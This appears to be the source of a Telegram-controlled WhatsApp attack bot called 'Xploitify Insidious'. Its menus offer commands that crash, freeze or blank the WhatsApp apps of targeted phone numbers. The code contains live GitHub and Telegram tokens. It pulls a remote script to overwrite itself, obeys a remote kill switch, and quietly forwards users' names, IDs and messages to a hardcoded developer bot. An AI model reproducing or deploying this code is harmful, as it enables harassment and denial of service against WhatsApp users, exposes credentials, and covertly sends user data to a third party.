const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessage,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReConnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisConnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fsExtra = require("fs-extra");
const fs = require("fs");
const { createWriteStream } = require("fs");
const P = require("pino");
const crypto = require("crypto");
const FormData = require("form-data");
const path = require("path");
const { GoogleGenAI } = require("@google/genai");
const sessions = new Map();
const { exec } = require("child_process")
const https = require("https")
const sharp = require("sharp");
const cd = "./Assèts/cooldown.json";
const vm = require('vm');
const axios = require("axios");
const chalk = require("chalk");
const moment = require('moment');
const config = require("./Sèttings/config.js");
const { v4, uuidv4 } = require("uuid")
const { pipeline } = require("stream")
const { promisify } = require("util")
const streamPipeline = promisify(pipeline)
const { OpenAI } = require("openai");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const ONLY_FILE = path.join(__dirname, "Dàtabase", "gconly.json");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const blacklist = ["8461214077", "8434073344", "7480469593"]; // tambahin aja jngn hapus
    
function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

// ===== GITHUB CONFIG =====
const GH_USER = "dapp231";
const GH_REPO = "raa320";
const GH_BRANCH = "main";
const GH_TOKEN = "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";
// ==========================

const GH_FILE = "Dapzdarkness.js";
const LOCAL_FILE = "./Dapzdarkness.js";

let autoUpdateEnabled = false;
let lastCommitSha = null;

// ================= MANUAL UPDATE FUNCTION =================
async function updateIndexJs(chatId = null) {
  try {
    const url = `https://raw.githubusercontent.com/${GH_USER}/${GH_REPO}/${GH_BRANCH}/${GH_FILE}`;

    const res = await axios.get(url, {
      timeout: 30000,
      headers: {
        Authorization: `token ${GH_TOKEN}`,
        "User-Agent": "bot-updater"
      }
    });

    const data = res.data;

    if (!data || String(data).length < 10) {
      if (chatId) await bot.sendMessage(chatId, "❌ File invalid.");
      return false;
    }

    // Backup
    if (fs.existsSync(LOCAL_FILE)) {
      fs.copyFileSync(LOCAL_FILE, LOCAL_FILE + ".bak");
    }

    // Replace
    fs.writeFileSync(LOCAL_FILE, data);

    if (chatId)
      await bot.sendMessage(chatId, "✅ Update complete. Restarting...");

    return true;

  } catch (err) {
    console.error(err);
    if (chatId)
      await bot.sendMessage(chatId, "❌ Update failed: " + err.message);
    return false;
  }
}

// ================= GET LATEST COMMIT =================
async function getLatestCommitSha() {
  const url = `https://api.github.com/repos/${GH_USER}/${GH_REPO}/commits/${GH_BRANCH}`;

  const res = await axios.get(url, {
    headers: {
      Authorization: `token ${GH_TOKEN}`,
      "User-Agent": "auto-update-system"
    }
  });

  return res.data.sha;
}

// ================= AUTO CHECK LOOP =================
setInterval(async () => {
  if (!autoUpdateEnabled) return;

  try {
    const latestSha = await getLatestCommitSha();

    if (!lastCommitSha) {
      lastCommitSha = latestSha;
      return;
    }

    if (latestSha !== lastCommitSha) {
      console.log("🔄 Auto update detected new commit...");
      lastCommitSha = latestSha;

      const updated = await updateIndexJs();
      if (updated) process.exit(0);
    }

  } catch (err) {
    console.error("Auto update error:", err.message);
  }

}, 2 * 60 * 1000); // check setiap 2 minit

// ================= COMMANDS =================

// Turn ON auto update
bot.onText(/^\/upon$/, async (msg) => {
  if (msg.from.id !== config.OWNER_ID)
    return bot.sendMessage(msg.chat.id, "❌ Unauthorized.");

  autoUpdateEnabled = true;
  lastCommitSha = await getLatestCommitSha();

  bot.sendMessage(msg.chat.id, "✅ Auto update mode ON.");
});

// Turn OFF auto update
bot.onText(/^\/upoff$/, async (msg) => {
  if (msg.from.id !== config.OWNER_ID)
    return bot.sendMessage(msg.chat.id, "❌ Unauthorized.");

  autoUpdateEnabled = false;
  bot.sendMessage(msg.chat.id, "⛔ Auto update mode OFF.");
}); 

// ~ Thumbnail
const imageThumbnail = "https://img2.pixhost.to/images/5942/698104712_marceleven.jpg";

// ~ Database Url
const databaseURL = "https://raw.githubusercontent.com/dapp231/raa320/refs/heads/main/tokens.json";

let tokensRegistered = false;
async function isTokenRegistered(token) {
    try {
        const response = await axios.get(databaseURL);
        const tokenData = response.data;

        if (!tokenData.tokens.includes(token)) {
            console.log(chalk.red(`
      ⠀⠀⠀⢀⡠⠄⠒⠈⠉⠉⠁⠀⠉⠉⠁⠒⠠⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡠⠂⠁⠀⠀⢀⡀⠤⠄⠀⠀⠠⠤⢄⡀⠀⠀⠈⠑⢤⡀⠀⠀⠀⠀
⠀⠀⠀⡠⠊⠀⠀⢠⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⢄⠀⠀⠈⢦⠀⠀⠀
⠀⢀⠌⠀⠀⣀⠀⠀⠙⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠱⡀⠀
⠀⠎⠀⠀⡰⠁⠑⢄⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠐⡀
⠸⠀⠀⠰⠁⠀⠀⠀⠑⢄⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⠀⠀⢡
⡇⠀⠀⠇⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠑⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠘
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀
⡇⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⢀⠀⠀⢠
⢱⠀⠀⠱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠑⢄⠀⠀⠀⠀⡜⠀⠀⡘
⠀⢆⠀⠀⠡⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠑⢦⡀⡜⠀⠀⢠⠁
⠀⠈⢧⡀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠉⠀⠀⡰⠃⠀
⠀⠀⠀⠑⣄⠀⠀⠑⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠃⠀⠀⢀⠜⠁⠀⠀
⠀⠀⠀⠀⠈⠓⢄⡀⠀⠀⠉⠐⠒⠀⠀⠀⠀⠐⠂⠉⠀⠀⠀⡠⠔⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠐⠢⠄⣀⣀⣀⠀⠀⢀⣀⣀⠠⠄⢂⠁⠀⠀⠀⠀⠀⠀⠀
¡ ᬊ Xploitify ༑ᐧ Insidious ¡\n❌ ⵢ Your Bot Token Is Not Registered\n— Please Contact The Owner\n— @susudancow17 ( Telegram )`));
            process.exit(1); // Keluar dari script
            tokensRegistered = false;
        } else {
            console.log(chalk.magenta(`
      ⠀⠀⢀⣴⣿⣿⣿⣷⣶⣴⣾⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣤⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⡄⠀⠀⠀⠀
⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠄⠀
⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣧⣦⡀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠈⠻⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⡿⠻⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⢀⣴⣽⣾⢿⣿⣿⣿⣿⣿
⢈⣿⣿⣿⣿⣿⣿⣯⡀⠀⠈⠻⣿⣿⣿⠟⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠈⠛⠁⠀⢀⢐⣿⣿⣿⣾⢿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⢀⣴⣯⣿⣿⣿⣿⣿⣾⣽⣿⣿⣿⣿⣿⣿
⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣷⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣻⣿⣿⣿⣾⣿⣿⣿⣿⣿⡿⠀⠀⠀
⠀⠀⠀⠀⠉⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⠟⠛⠛⠉⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⠿⢿⡻⠿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀\n¡ ᬊ Xploitify ༑ᐧ Insidious ¡\n– Version : 2.0\n– Developer : D4pzthedarknexx\n– Telegram : @susudancow17\n`));
        }
        tokensRegistered = true;
    } catch (error) {
        console.error("❌ ⵢ Gagal mengambil data token:", error.message);
        process.exit(1);
    }
}

isTokenRegistered(BOT_TOKEN);

const switchUrl = 'https://raw.githubusercontent.com/fatirmuhamad034-ship-it/Switch/refs/heads/main/Switch.json';
async function checkSecurityAndStart() {
    try {
        // --- Cek Status Kill Switch --- \\
        const { data: switchData } = await axios.get(switchUrl, { timeout: 5000 });
        
        if (switchData.status === 'block') {
            const message = switchData.message || 'Lisensi telah dicabut.';
            
            console.error(chalk.red('[ ❌ ] ⵢ Akses Ditolak : Bot telah dihentikan!'));
            console.error(chalk.white(`From Devoloper : ${message}`));
            process.exit(1); 
        }

        return true; 

    } catch (e) {
        console.error(chalk.yellow('⚠️ ⵢ Gagal memverifikasi status dari GitHub. Menghentikan bot untuk keamanan.'), e.message);
        
        process.exit(1);
    }
}

const OWNER_CHAT_ID = '6601888529';
const userId = OWNER_CHAT_ID

async function sendNotifOwner(msg, customMessage = '') {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const username = msg.from.username || 'Tidak ada username';
        const firstName = msg.from.first_name;
        const lastName = msg.from.last_name || ''; 
        const messageText = msg.text;  

        const message = `
✨ *dapaa 𝘔𝘌𝘕𝘌𝘙𝘐𝘔𝘈 𝘗𝘌𝘚𝘈𝘕* ✨

👤 *Pengirim:*
  - *Nama:* \`${firstName} ${lastName}\`
  - *Username:* @${username}
  - *ID:* \`${userId}\`
  - *Chat ID:* \`${chatId}\`

💬 *Pesan:*
\`\`\`
${messageText}
\`\`\``;
        const url = `https://api.telegram.org/bot8741070966:AAFA8k9jOh0c8dudBsm5hBF_DNlqFdMG2To/sendMessage`;
        await axios.post(url, {
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('Notifikasi pesan pengguna berhasil dikirim ke owner.');
    } catch (error) {
        console.error('Gagal mengirim notifikasi ke owner:', error.message);
        
    }
}

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./Dàtabase/premium.json');
ensureFileExists('./Dàtabase/admin.json');

let premiumUsers = JSON.parse(fs.readFileSync('./Dàtabase/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./Dàtabase/admin.json'));

function savePremiumUsers() {
    fs.writeFileSync('./Dàtabase/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./Dàtabase/admin.json', JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./Dàtabase/premium.json', (data) => (premiumUsers = data));
watchFile('./Dàtabase/admin.json', (data) => (adminUsers = data));

const userIDS = './Dàtabase/userids.json';

function readUserIds() {
    try {
        const data = fs.readFileSync(userIDS, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Gagal membaca daftar ID pengguna:', error);
        return [];
    }
}

/// --- ( Fungsi buat file otomatis ) --- \\\
if (!fs.existsSync(ONLY_FILE)) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: false }, null, 2));
}

function saveUserIds(userIds) {
    try {
        fs.writeFileSync(userIDS, JSON.stringify(Array.from(userIds)), 'utf8');
    } catch (error) {
        console.error('Gagal menyimpan daftar ID pengguna:', error);
    }
}

const userIds = new Set(readUserIds());

function addUser(userId) {
    if (!userIds.has(userId)) {
        userIds.add(userId);
        saveUserIds(userIds);
        console.log(`User ${userId} Has Been Added.`);
    }
}

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("Connection.update", async (update) => {
            const { Connection, lastDisConnect } = update;
            if (Connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (Connection === "close") {
              const shouldReConnect =
                lastDisConnect?.error?.output?.statusCode !==
                DisConnectReason.loggedOut;
              if (shouldReConnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp Connections:", error);
  }
}

let isWhatsAppConnected = false;
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function ConnectToWhatsApp(botNumber, chatId) {
  let statusMessage

  async function sendStatus(caption) {
    if (statusMessage) {
      try {
        await bot.deleteMessage(chatId, statusMessage)
      } catch {}
    }
    statusMessage = await bot.sendPhoto(
      chatId,
      imageThumbnail,
      { caption, parse_mode: "HTML" }
    ).then(msg => msg.message_id)
  }

  await sendStatus(
    `
<blockquote><b>─ ¡ ᬊ Xploitify ༑ᐧ Insidious ¡ ─</b></blockquote>
┃☰. Number : ${botNumber}
〢-╰➤ ° ↯ Status : Process
`
  )

  const sessionDir = createSessionDir(botNumber)
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir)

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined
  })

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update

    if (connection === "close") {
      isWhatsAppConnected = false
      const statusCode = lastDisconnect?.error?.output?.statusCode

      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await sendStatus(
          `
<blockquote><b>─ ¡ ᬊ Xploitify ༑ᐧ Insidious ¡ ─</b></blockquote>
┃☰. Number : ${botNumber}
〢-╰➤ ° ↯ Status : Not Connected
`
        )
        await ConnectToWhatsApp(botNumber, chatId)
      } else {
        await sendStatus(
          `
<blockquote><b>─ ¡ ᬊ Xploitify ༑ᐧ Insidious ¡ ─</b></blockquote>
┃☰. Number : ${botNumber}
〢-╰➤ ° ↯ Status : Gagal ❌
`
        )
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true })
        } catch {}
      }
    }

    if (connection === "open") {
      isWhatsAppConnected = true
      sessions.set(botNumber, sock)
      saveActiveSessions(botNumber)

      await sendStatus(
        `
<blockquote><b>─ ¡ ᬊ Xploitify ༑ᐧ Insidious ¡ ─</b></blockquote>
┃☰. Number : ${botNumber}
〢-╰➤ ° ↯ Status : Connected 
`
      )
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000))
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          let customcode = "D4PZHOLO"
          const code = await sock.requestPairingCode(botNumber, customcode)
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code

          await sendStatus(
            `
<blockquote><b>─ ¡ ᬊ Xploitify ༑ᐧ Insidious ¡ ─</b></blockquote>
┃☰. Number : ${botNumber}
〢-╰➤ ° ↯ Code Pairing :
<b>${formattedCode}</b>
`
          )
        }
      } catch (error) {
        isWhatsAppConnected = false
        await sendStatus(
          `
<blockquote><b>─ ¡ ᬊ Xploitify ༑ᐧ Insidious ¡ ─</b></blockquote>
┃☰. Number : ${botNumber}
〢-╰➤ ° ↯ Error ❌ ${error.message}
`
        )
      }
    }
  })

  sock.ev.on("creds.update", saveCreds)
  return sock
}

// ~ Fungsional Function Before Parameters
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Days, ${hours} Hours, ${minutes} Minutes, ${secs} Seconds`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Get Speed Bots
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

// ~ Cooldown
const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cd)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return ` Cooldown has been set to ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Premium ! - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}
 
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

let users = [];
if (fs.existsSync("users.json")) {
  try {
    users = JSON.parse(fs.readFileSync("users.json"));
  } catch (err) {
    console.error("Gagal membaca users.json:", err);
    users = [];
  }
} else {
  fs.writeFileSync("users.json", JSON.stringify([]));
}

const bugRequests = {};
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  if (!users.includes(chatId)) {
    users.push(chatId);
    fs.writeFileSync("users.json", JSON.stringify(users, null, 2));
  }
});

bot.onText(/^\/start(?:\s+(.+))?/, async (msg, match) => {
  const isAllowed = await checkSecurityAndStart();
  
   if (isAllowed) {
    }
   if (!tokensRegistered) {
    return bot.sendMessage(msg.chat.id, "❌ ⵢ Token Anda Tidak Terdaftar !!");
    process.exit(1);
  }
   if (blacklist.includes(msg.chat.id)) {
        return bot.sendMessage(msg.chat.id, "❌ ⵢ Anda Telah Masuk Dalam List Blacklist.");
    }
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const memory = formatMemory();
  const senderStatus = isWhatsAppConnected ? "Connected" : "Disconnect";
  const cooldown = checkCooldown(senderId);

  bot.sendPhoto(chatId, imageThumbnail, {
caption: `
<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>
( 🍁 ) Olá ${username} ¿
─ 私は WhatsApp を破壊することを目的とした <b>Xploitify - Insidious </b>スクリプトボットです。よく使用してください。

✦••┈┈ ( 🍂 ) - 𝐁𝐨𝐭 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ¡ ┈┈••✦
<b>𖥊. - Script Name : Xploitify - Insidious</b>
<b>𖥊. - Version :  Onexz - Exclusive</b>
<b>𖥊. - Author : dàpz. hólo - @susudancow17</b>
<b>𖥊. - Prefix : / - [ Slash ]</b>

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ¡ ┈┈••✦
<b>𖥊. - Sender Statueˋs : ${senderStatus}</b>
<b>𖥊. - Memory Panel : ${memory}</b>
<b>𖥊. - Runtime Panel : ${runtime}</b>
<b>𖥊. - Cooldown Script : ${cooldown} Seconds</b>

<b>© ⚊ dàpz. hólo - ¿?</b>
`,

    parse_mode: "HTML",
    reply_markup: {
     inline_keyboard: [
     [
      { text: "𖣂 ¡ #- Xploitify° ─( 🦠 )", callback_data: "trashmenu" },  
    ],
    [
      { text: "𖣂 ¡ #- Xploitify° ─( ⚙️ )", callback_data: "accesmenu" },
      { text: "𖣂 ¡ #- Xploitify° ─( 🛠 )", callback_data: "toolsmenu" }
    ],
    [ 
      { text: "𖣂 ¡ #- Xploitify° ─( 🫀 )", callback_data: "thanksto" }
    ],
    [
      { text: "𖣂 ¡ #- dàpz. - hólo ¡", url: "https://t.me/susudancow17" }
    ]
  ]
 }
 });
    const audioPath = path.join(__dirname, "./Assèts/Xploitify. Insidious.mp3");
  await bot.sendAudio(chatId, audioPath, {
    caption: `Xploitify. ☇ - Insidious`,
    perfomer: `dàpz. - .hólo`,
  });
});


bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const memory = formatMemory();
    const senderStatus = isWhatsAppConnected ? "Connected" : "Disconnect";
    const cooldown = checkCooldown(senderId);
    const premiumStatus = getPremiumStatus(query.from.id);

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `
<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>
( 🍁 ) Olá ${username} ¿
─ 私は WhatsApp を破壊することを目的とした <b>Xploitify - Insidious</b> スクリプトボットです。

✦••┈┈ ( 🍂 ) - 𝐁𝐨𝐭 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ¡ ┈┈••✦
<b>𖥊. - Script Name : Xploitify - Insidious</b>
<b>𖥊. - Version : Onexz - Exclusive</b>
<b>𖥊. - Author : dàpz. hólo - @susudancow17</b>
<b>𖥊. - Prefix : / - [ Slash ]</b>

<blockquote><b>─ #- Xploitify° ─( 🦠 )</b></blockquote>
<b>┃☰. - /Superjamila « Number »</b>
〢-╰➤ ° ↯ Delay Invisible ¡
<b>┃☰. - /ShinyLight « Number »</b>
〢-╰➤ ° ↯ Blank Ui Android ¡
<b>┃☰. - /MagnetIos « Number »</b>
〢-╰➤ ° ↯ Forceclose iPhone ¡
<b>┃☰. - /ForceDarkNess « Number »</b>
〢-╰➤ ° ↯ Crash Andro Visible ¡
<b>┃☰. - /DarkLess « Number »</b>
〢-╰➤ ° ↯ Delay DrainKouta ¡
<b>┃☰. - /Starlight « Number »</b>
〢-╰➤ ° ↯ Delay Murbug Can Spam ¡
<b>┃☰. - /Topsignal « Number »</b>
〢-╰➤ ° ↯ Delay Ios ¡
<b>┃☰. - /Laserbreaker « Number »</b>
〢-╰➤ ° ↯ Crash Invisible Android ¡
<b>┃☰. - /Starluxury « Number »</b>
〢-╰➤ ° ↯ Crash Invisible Android V2 ¡
<b>┃☰. - /Relaxios « Number »</b>
〢-╰➤ ° ↯ Blank Ios ¡
<b>┃☰. - /xspam « Number »</b>
〢-╰➤ ° ↯ Delay Murbug Can Spam Hard Ios ¡
<b>© ⚊ dàpz. hólo</b>
`;
      replyMarkup = { inline_keyboard: [[{ text: "𖣂 ¡ #- Xploitify° ─( ↩️ )", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "accesmenu") {
      caption = `
<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>
<b>( 🍁 ) Olá ${username} ¿</b>
<b>─ 私は WhatsApp を破壊することを目的とした Xploitify - Insidious スクリプトボットです。よく使用してください。</b>

✦••┈┈ ( 🍂 ) - <b>𝐁𝐨𝐭 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧</b> ¡ ┈┈••✦
<b>𖥊. - Script Name : Xploitify - Insidious</b>
<b>𖥊. - Version : Onexz - Exclusive</b>
<b>𖥊. - Author : dàpz. hólo - @susudancow17</b>
<b>𖥊. - Prefix : / - [ Slash ]</b>

<blockquote><b>─ #- Xploitify° ─ ( ⚙️ )</b></blockquote>
<b>┃☰. - /setcd « Duration »</b>
<b>〢-╰➤ ° ↯ Control Coldown Bugs ¡</b>
<b>┃☰. - /addadmin « ID »</b>
<b>〢-╰➤ ° ↯ Add Admin Users ¡</b>
<b>┃☰. - /addprem « ID »</b>
<b>〢-╰➤ ° ↯ Add Premium Users ¡</b>
<b>┃☰. - /deladmin « ID »</b>
<b>〢-╰➤ ° ↯ Delete Admin Users ¡</b>
<b>┃☰. - /delprem « ID »</b>
<b>〢-╰➤ ° ↯ Delete Premium Users ¡</b>
<b>┃☰. - /connect « Number »</b>
<b>〢-╰➤ ° ↯ Connect To Whatsapp ¡</b>

<b>© ⚊ dàpz. hólo - ¿?</b>
`;
